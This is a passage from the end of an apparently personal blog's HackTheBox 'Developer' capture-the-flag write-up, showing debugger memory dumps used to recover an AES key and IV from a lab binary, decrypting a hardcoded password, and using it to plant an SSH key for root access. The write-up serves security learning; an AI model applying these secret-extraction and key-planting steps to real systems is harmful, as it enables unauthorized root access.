</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">stack</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">00007</span><span style="color:#a6e22e">FFFDE1B23A1</span> <span style="color:#a6e22e">db</span>  <span style="color:#ae81ff">1</span><span style="color:#a6e22e">Fh</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">stack</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">00007</span><span style="color:#a6e22e">FFFDE1B23A2</span> <span style="color:#a6e22e">db</span>  <span style="color:#ae81ff">59</span><span style="color:#a6e22e">h</span> ; <span style="color:#a6e22e">Y</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">stack</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">00007</span><span style="color:#a6e22e">FFFDE1B23A3</span> <span style="color:#a6e22e">db</span> <span style="color:#ae81ff">0E3</span><span style="color:#a6e22e">h</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">stack</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">00007</span><span style="color:#a6e22e">FFFDE1B23A4</span> <span style="color:#a6e22e">db</span> <span style="color:#ae81ff">0</span><span style="color:#a6e22e">D9h</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">stack</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">00007</span><span style="color:#a6e22e">FFFDE1B23A5</span> <span style="color:#a6e22e">db</span> <span style="color:#ae81ff">0</span><span style="color:#a6e22e">D2h</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">stack</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">00007</span><span style="color:#a6e22e">FFFDE1B23A6</span> <span style="color:#a6e22e">db</span>  <span style="color:#ae81ff">95</span><span style="color:#a6e22e">h</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">stack</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">00007</span><span style="color:#a6e22e">FFFDE1B23A7</span> <span style="color:#a6e22e">db</span>  <span style="color:#ae81ff">9</span><span style="color:#a6e22e">Ah</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">stack</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">00007</span><span style="color:#a6e22e">FFFDE1B23A8</span> <span style="color:#a6e22e">db</span> <span style="color:#ae81ff">0</span><span style="color:#a6e22e">A7h</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">stack</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">00007</span><span style="color:#a6e22e">FFFDE1B23A9</span> <span style="color:#a6e22e">db</span>  <span style="color:#ae81ff">98</span><span style="color:#a6e22e">h</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">stack</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">00007</span><span style="color:#a6e22e">FFFDE1B23AA</span> <span style="color:#a6e22e">db</span>  <span style="color:#ae81ff">55</span><span style="color:#a6e22e">h</span> ; <span style="color:#a6e22e">U</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">stack</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">00007</span><span style="color:#a6e22e">FFFDE1B23AB</span> <span style="color:#a6e22e">db</span> <span style="color:#ae81ff">0</span><span style="color:#a6e22e">DCh</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">stack</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">00007</span><span style="color:#a6e22e">FFFDE1B23AC</span> <span style="color:#a6e22e">db</span>    <span style="color:#ae81ff">6</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">stack</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">00007</span><span style="color:#a6e22e">FFFDE1B23AD</span> <span style="color:#a6e22e">db</span>  <span style="color:#ae81ff">20</span><span style="color:#a6e22e">h</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">stack</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">00007</span><span style="color:#a6e22e">FFFDE1B23AE</span> <span style="color:#a6e22e">db</span>  <span style="color:#ae81ff">81</span><span style="color:#a6e22e">h</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">stack</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">00007</span><span style="color:#a6e22e">FFFDE1B23AF</span> <span style="color:#a6e22e">db</span>  <span style="color:#ae81ff">6</span><span style="color:#a6e22e">Ah</span>
</span></span></code></pre></div><p>The formated IV is the following:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="display:flex"><span><span style="color:#ae81ff">76</span> <span style="color:#ae81ff">1</span><span style="color:#a6e22e">F</span> <span style="color:#ae81ff">59</span> <span style="color:#a6e22e">E3</span> <span style="color:#a6e22e">D9</span> <span style="color:#a6e22e">D2</span> <span style="color:#ae81ff">95</span> <span style="color:#ae81ff">9</span><span style="color:#a6e22e">A</span> <span style="color:#a6e22e">A7</span> <span style="color:#ae81ff">98</span> <span style="color:#ae81ff">55</span> <span style="color:#a6e22e">DC</span> <span style="color:#ae81ff">06</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">81</span> <span style="color:#ae81ff">6</span><span style="color:#a6e22e">A</span>
</span></span></code></pre></div><p>Also, if you continue executing until the symmetric encryption, another
string appears in the stack:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="display:flex"><span>[<span style="color:#a6e22e">heap</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">0000559</span><span style="color:#a6e22e">BE21CAA10</span> <span style="color:#a6e22e">db</span> <span style="color:#ae81ff">0</span><span style="color:#a6e22e">FEh</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">heap</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">0000559</span><span style="color:#a6e22e">BE21CAA11</span> <span style="color:#a6e22e">db</span>  <span style="color:#ae81ff">1</span><span style="color:#a6e22e">Bh</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">heap</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">0000559</span><span style="color:#a6e22e">BE21CAA12</span> <span style="color:#a6e22e">db</span>  <span style="color:#ae81ff">25</span><span style="color:#a6e22e">h</span> ; <span style="color:#f92672">%</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">heap</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">0000559</span><span style="color:#a6e22e">BE21CAA13</span> <span style="color:#a6e22e">db</span> <span style="color:#ae81ff">0</span><span style="color:#a6e22e">F0h</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">heap</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">0000559</span><span style="color:#a6e22e">BE21CAA14</span> <span style="color:#a6e22e">db</span>  <span style="color:#ae81ff">80</span><span style="color:#a6e22e">h</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">heap</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">0000559</span><span style="color:#a6e22e">BE21CAA15</span> <span style="color:#a6e22e">db</span>  <span style="color:#ae81ff">6</span><span style="color:#a6e22e">Ah</span> ; <span style="color:#a6e22e">j</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">heap</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">0000559</span><span style="color:#a6e22e">BE21CAA16</span> <span style="color:#a6e22e">db</span>  <span style="color:#ae81ff">97</span><span style="color:#a6e22e">h</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">heap</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">0000559</span><span style="color:#a6e22e">BE21CAA17</span> <span style="color:#a6e22e">db</span> <span style="color:#ae81ff">0</span><span style="color:#a6e22e">CAh</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">heap</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">0000559</span><span style="color:#a6e22e">BE21CAA18</span> <span style="color:#a6e22e">db</span>  <span style="color:#ae81ff">78</span><span style="color:#a6e22e">h</span> ; <span style="color:#a6e22e">x</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">heap</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">0000559</span><span style="color:#a6e22e">BE21CAA19</span> <span style="color:#a6e22e">db</span>  <span style="color:#ae81ff">80</span><span style="color:#a6e22e">h</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">heap</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">0000559</span><span style="color:#a6e22e">BE21CAA1A</span> <span style="color:#a6e22e">db</span> <span style="color:#ae81ff">0</span><span style="color:#a6e22e">FDh</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">heap</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">0000559</span><span style="color:#a6e22e">BE21CAA1B</span> <span style="color:#a6e22e">db</span>  <span style="color:#ae81ff">58</span><span style="color:#a6e22e">h</span> ; <span style="color:#a6e22e">X</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">heap</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">0000559</span><span style="color:#a6e22e">BE21CAA1C</span> <span style="color:#a6e22e">db</span> <span style="color:#ae81ff">0</span><span style="color:#a6e22e">FCh</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">heap</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">0000559</span><span style="color:#a6e22e">BE21CAA1D</span> <span style="color:#a6e22e">db</span>  <span style="color:#ae81ff">5</span><span style="color:#a6e22e">Ch</span> ; <span style="color:#f92672">\</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">heap</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">0000559</span><span style="color:#a6e22e">BE21CAA1E</span> <span style="color:#a6e22e">db</span>  <span style="color:#ae81ff">20</span><span style="color:#a6e22e">h</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">heap</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">0000559</span><span style="color:#a6e22e">BE21CAA1F</span> <span style="color:#a6e22e">db</span>  <span style="color:#ae81ff">23</span><span style="color:#a6e22e">h</span> ; <span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">heap</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">0000559</span><span style="color:#a6e22e">BE21CAA20</span> <span style="color:#a6e22e">db</span>  <span style="color:#ae81ff">6</span><span style="color:#a6e22e">Ch</span> ; <span style="color:#a6e22e">l</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">heap</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">0000559</span><span style="color:#a6e22e">BE21CAA21</span> <span style="color:#a6e22e">db</span> <span style="color:#ae81ff">0</span><span style="color:#a6e22e">A2h</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">heap</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">0000559</span><span style="color:#a6e22e">BE21CAA22</span> <span style="color:#a6e22e">db</span> <span style="color:#ae81ff">0</span><span style="color:#a6e22e">DBh</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">heap</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">0000559</span><span style="color:#a6e22e">BE21CAA23</span> <span style="color:#a6e22e">db</span> <span style="color:#ae81ff">0</span><span style="color:#a6e22e">D0h</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">heap</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">0000559</span><span style="color:#a6e22e">BE21CAA24</span> <span style="color:#a6e22e">db</span> <span style="color:#ae81ff">0E5</span><span style="color:#a6e22e">h</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">heap</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">0000559</span><span style="color:#a6e22e">BE21CAA25</span> <span style="color:#a6e22e">db</span>    <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">heap</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">0000559</span><span style="color:#a6e22e">BE21CAA26</span> <span style="color:#a6e22e">db</span> <span style="color:#ae81ff">0</span><span style="color:#a6e22e">B5h</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">heap</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">0000559</span><span style="color:#a6e22e">BE21CAA27</span> <span style="color:#a6e22e">db</span> <span style="color:#ae81ff">0</span><span style="color:#a6e22e">FAh</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">heap</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">0000559</span><span style="color:#a6e22e">BE21CAA28</span> <span style="color:#a6e22e">db</span> <span style="color:#ae81ff">0</span><span style="color:#a6e22e">EBh</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">heap</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">0000559</span><span style="color:#a6e22e">BE21CAA29</span> <span style="color:#a6e22e">db</span> <span style="color:#ae81ff">0</span><span style="color:#a6e22e">C0h</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">heap</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">0000559</span><span style="color:#a6e22e">BE21CAA2A</span> <span style="color:#a6e22e">db</span> <span style="color:#ae81ff">0</span><span style="color:#a6e22e">AFh</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">heap</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">0000559</span><span style="color:#a6e22e">BE21CAA2B</span> <span style="color:#a6e22e">db</span>  <span style="color:#ae81ff">3</span><span style="color:#a6e22e">Ah</span> ; <span style="color:#f92672">:</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">heap</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">0000559</span><span style="color:#a6e22e">BE21CAA2C</span> <span style="color:#a6e22e">db</span>  <span style="color:#ae81ff">9</span><span style="color:#a6e22e">Fh</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">heap</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">0000559</span><span style="color:#a6e22e">BE21CAA2D</span> <span style="color:#a6e22e">db</span>  <span style="color:#ae81ff">27</span><span style="color:#a6e22e">h</span> ; <span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">heap</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">0000559</span><span style="color:#a6e22e">BE21CAA2E</span> <span style="color:#a6e22e">db</span>  <span style="color:#ae81ff">15</span><span style="color:#a6e22e">h</span>
</span></span><span style="display:flex"><span>[<span style="color:#a6e22e">heap</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">0000559</span><span style="color:#a6e22e">BE21CAA2F</span> <span style="color:#a6e22e">db</span>  <span style="color:#ae81ff">2</span><span style="color:#a6e22e">Ch</span> ; ,
</span></span></code></pre></div><p>Which formatted is the following:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="display:flex"><span><span style="color:#a6e22e">FE</span> <span style="color:#ae81ff">1</span><span style="color:#a6e22e">B</span> <span style="color:#ae81ff">25</span> <span style="color:#a6e22e">F0</span> <span style="color:#ae81ff">80</span> <span style="color:#ae81ff">6</span><span style="color:#a6e22e">A</span> <span style="color:#ae81ff">97</span> <span style="color:#a6e22e">CA</span> <span style="color:#ae81ff">78</span> <span style="color:#ae81ff">80</span> <span style="color:#a6e22e">FD</span> <span style="color:#ae81ff">58</span> <span style="color:#a6e22e">FC</span> <span style="color:#ae81ff">5</span><span style="color:#a6e22e">C</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">23</span> <span style="color:#ae81ff">6</span><span style="color:#a6e22e">C</span> <span style="color:#a6e22e">A2</span> <span style="color:#a6e22e">DB</span> <span style="color:#a6e22e">D0</span> <span style="color:#a6e22e">E5</span> <span style="color:#ae81ff">02</span> <span style="color:#a6e22e">B5</span> <span style="color:#a6e22e">FA</span> <span style="color:#a6e22e">EB</span> <span style="color:#a6e22e">C0</span> <span style="color:#a6e22e">AF</span> <span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span> <span style="color:#ae81ff">9</span><span style="color:#a6e22e">F</span> <span style="color:#ae81ff">27</span> <span style="color:#ae81ff">15</span> <span style="color:#ae81ff">2</span><span style="color:#a6e22e">C</span>
</span></span></code></pre></div><p>If we use this 3 hex strings in
<a href="https://gchq.github.io/CyberChef/">cyberchef</a> + AES Decrypt + Mode:
CTR, we get the key: <code>RustForSecurity@Developer@2021:)</code>. We can now use
the authenticator executable:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="display:flex"><span><span style="color:#a6e22e">Welcome</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">TheCyberGeek</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">s</span> <span style="color:#66d9ef">super</span> <span style="color:#a6e22e">secure</span> <span style="color:#a6e22e">login</span> <span style="color:#a6e22e">portal</span><span style="color:#f92672">!</span>
</span></span><span style="display:flex"><span><span style="color:#a6e22e">Enter</span> <span style="color:#a6e22e">your</span> <span style="color:#a6e22e">password</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">access</span> <span style="color:#a6e22e">the</span> <span style="color:#66d9ef">super</span> <span style="color:#a6e22e">user</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex"><span><span style="color:#a6e22e">RustForSecurity</span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">Developer</span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#ae81ff">2021</span><span style="color:#f92672">:</span>)
</span></span><span style="display:flex"><span><span style="color:#a6e22e">You</span> <span style="color:#a6e22e">have</span> <span style="color:#a6e22e">successfully</span> <span style="color:#a6e22e">authenticated</span>
</span></span></code></pre></div><p>We will be prompted for a SSH public key. We can generate one locally
and copy the <code>.pub</code> file.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="display:flex"><span><span style="color:#a6e22e">Enter</span> <span style="color:#a6e22e">your</span> <span style="color:#a6e22e">SSH</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">key</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">now</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">PUBLIC</span><span style="color:#f92672">-</span><span style="color:#a6e22e">KEY</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex"><span><span style="color:#a6e22e">You</span> <span style="color:#a6e22e">may</span> <span style="color:#a6e22e">now</span> <span style="color:#a6e22e">authenticate</span> <span style="color:#a6e22e">as</span> <span style="color:#a6e22e">root</span><span style="color:#f92672">!</span>
</span></span></code></pre></div><p>Then it will be added to <code>/root/.ssh/authenticated_keys</code>, so we can now
login with ssh and get the <code>root flag</code>!</p><h1 id="references">References<a hidden="" class="anchor" aria-hidden="true" href="#references">#</a></h1><ul><li><code>target=&#34;_blank&#34;</code> vuln:<div><a target="_blank" rel="noopener noreferrer" class="bookmark" href="http://www.js-craft.io/blog/window-open-and-target_blank-have-a-security-vulnerability/"><div><div class="bookmark-title">Window.open() and target=”_blank” have a security vulnerability</div><div class="bookmark-description">JavaScript, LangChain and AI integration resources.</div><div class="bookmark-link"><div>http://www.js-craft.io/blog/window-open-and-target_blank-have-a-security-vulnerability/</div></div></div><div class="bookmark-image"><img src="https://www.js-craft.io/_assets/daniel-js-craft.jpg" alt="" loading="lazy"/></div></a></div></li></ul></div><footer class="post-footer"><ul class="post-tags"><li><a href="https://xzebra.dev/tags/cybersecurity/">cybersecurity</a></li><li><a href="https://xzebra.dev/tags/ctf/">ctf</a></li><li><a href="https://xzebra.dev/tags/linux/">linux</a></li><li><a href="https://xzebra.dev/tags/hackthebox/">hackthebox</a></li></ul><div class="share-buttons"><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Developer on twitter" href="https://twitter.com/intent/tweet/?text=HackTheBox%20Writeup%3a%20Developer&amp;url=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_developer%2f&amp;hashtags=cybersecurity%2cctf%2clinux%2chackthebox"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"></path></svg></a><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Developer on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_developer%2f&amp;title=HackTheBox%20Writeup%3a%20Developer&amp;summary=HackTheBox%20Writeup%3a%20Developer&amp;source=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_developer%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"></path></svg></a><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Developer on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_developer%2f&amp;title=HackTheBox%20Writeup%3a%20Developer"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"></path></svg></a><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Developer on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_developer%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"></path></svg></a><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Developer on whatsapp" href="https://api.whatsapp.com/send?text=HackTheBox%20Writeup%3a%20Developer%20-%20https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_developer%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"></path></svg></a><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Developer on telegram" href="https://telegram.me/share/url?text=HackTheBox%20Writeup%3a%20Developer&amp;url=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_developer%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"></path></svg></a></div></footer></article></main><a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"></path></svg></a><script>let 